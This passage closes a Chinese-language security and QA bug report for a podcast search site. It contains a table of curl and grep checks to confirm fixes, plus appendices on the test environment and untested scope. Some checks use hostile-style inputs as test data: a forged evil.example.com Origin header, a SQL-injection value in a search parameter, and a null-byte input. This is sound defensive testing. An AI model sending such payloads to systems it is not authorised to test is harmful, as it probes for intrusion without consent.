| SEC-02 | `curl -sI -H "Origin: https://evil.example.com" $B/api/stats` ACAO 不應為 evil |
| SEC-03 | `curl -sI $B/docs` 預期 404 |
| SEC-04 | `curl -s "$B/api/search?q=test&show=X%22OR%221%3D1"` 預期 400 |
| SEC-05 | DevTools Network 看 admin 操作的 request URL，secret 不在 query string |
| SEC-06 | `grep -nE "(!=|==).*(secret|ingest_secret)" backend/app/` 應無剩餘 |
| SEC-07 | `curl -sI https://sear.newfolderla.com/` 看到 HSTS / CSP / X-Frame-Options |
| SEC-08 | `curl -s -D - "$B/api/text-count?q=hi%00bye"` 預期 400 而非 500 |
| SEC-09 | 看 `requirements.txt` 有 slowapi（或自訂限速器）；frontend input 有 maxLength |
| SEC-10 | 修了 SEC-01 自動解，`grep dangerouslySetInnerHTML frontend/src/` 應無或皆已 wrap 安全元件 |
| SEC-11 | OpenAPI / 代碼確認 `ReplaceTextRequest` 有 `dry_run` field，含 `field_validator` 拒絕 HTML 字元 |
| SEC-12 | `curl -sX POST $B/api/replace-text` 應回 403（不是 422） |
| SEC-13 | 訪問首頁，熱門關鍵字應已清理；DB 跑 `SELECT query FROM search_logs WHERE query IN (黑名單)` 應為 0 |
| SEC-14 | `curl -sI https://sear.newfolderla.com/` `x-powered-by` 不應出現 |
| BUG-01 | 在 input 輸入 `OpenAI` 搜，再點熱門關鍵字「黃國昌」，input 應同步顯示「黃國昌」 |
| BUG-02 | `curl "$B/api/search?q=电脑" \| jq .total_episodes` 與 `q=電腦` 應接近（不是 196 倍差） |
| WARN-01 | 開首頁 console 應無 favicon 404 |
| WARN-05 | Tab 進 segment，鉛筆 icon 應顯示 |

---

## 附錄

### A. 原始 QA 報告路徑

- QA Plan（功能初測）：[qa-reports/qa-plan-20260429-初測.md](qa-plan-20260429-初測.md)
- QA Report（功能初測）：[qa-reports/qa-report-20260429-初測.md](qa-report-20260429-初測.md)
- QA Plan（安全測試）：[qa-reports/qa-plan-20260429-安全測試.md](qa-plan-20260429-安全測試.md)
- Dev Bug Report（安全測試完整版）：[qa-reports/dev-bug-report-20260429-安全.md](dev-bug-report-20260429-安全.md)
- Regression specs：[qa-reports/regression/](regression/)
- Screenshots：[qa-reports/screenshots/](screenshots/)

### B. 測試環境

- Production frontend：https://sear.newfolderla.com
- Production backend：https://backend-production-b729.up.railway.app
- 測試瀏覽器：Playwright Chromium / macOS 15
- 測試方式：production GET-only 探測（無 POST 寫入）+ 代碼審查 + 受控前端 fetch 攔截

### C. 不在範圍（未測試，需 staging 環境驗證）

修這份文件的 bug 時，以下是**未經測試**的攻擊面，建議在 staging 一併補測：

- POST endpoint 注入測試（`/api/corrections`、`/api/replace-text`、`/api/maintenance/*`、`/api/corrections/{id}/approve|reject`、`/api/corrections/batch-approve`）
- Admin 已登入態下的 CSRF 與 token rotation
- 並發 / 壓力測試 / DoS payload
- 跨瀏覽器（Safari / Firefox / Edge）—— 本輪只測 Chromium
- 第三方依賴 CVE 掃描 —— 建議跑 `pip-audit` + `npm audit`
- SoundOn audio CDN 安全性 —— 不在控制範圍

### D. 測試紀錄統計

- ~70 次 GET request 到 production（無 POST 寫入）
- 1 次 Playwright 受控前端 fetch 攔截 PoC（不打後端）
- 代碼審查覆蓋：
  - `backend/app/main.py`
  - `backend/app/api/{search,corrections}.py`
  - `backend/app/core/{config,database,search}.py`
  - `backend/app/services/{rss_parser,indexer}.py`
  - `backend/app/scripts/ingest.py`
  - `backend/app/models/episode.py`
  - `backend/requirements.txt`
  - `frontend/src/app/{layout,page,globals.css}`
  - `frontend/src/app/{episode/[id],admin}/page.tsx`
  - `frontend/src/components/{SearchBar,SearchResults,EpisodeList}.tsx`
  - `frontend/src/lib/api.ts`
  - `frontend/next.config.ts`
- 測試耗時：~105 分鐘（功能 ~25 分 + 安全 ~80 分）

---

**祝修補順利。完成後建議再請 QA 跑一次回歸驗證——可以呼叫 qa-tester subagent 跑同樣的 PoC 確認 fix 有效。**
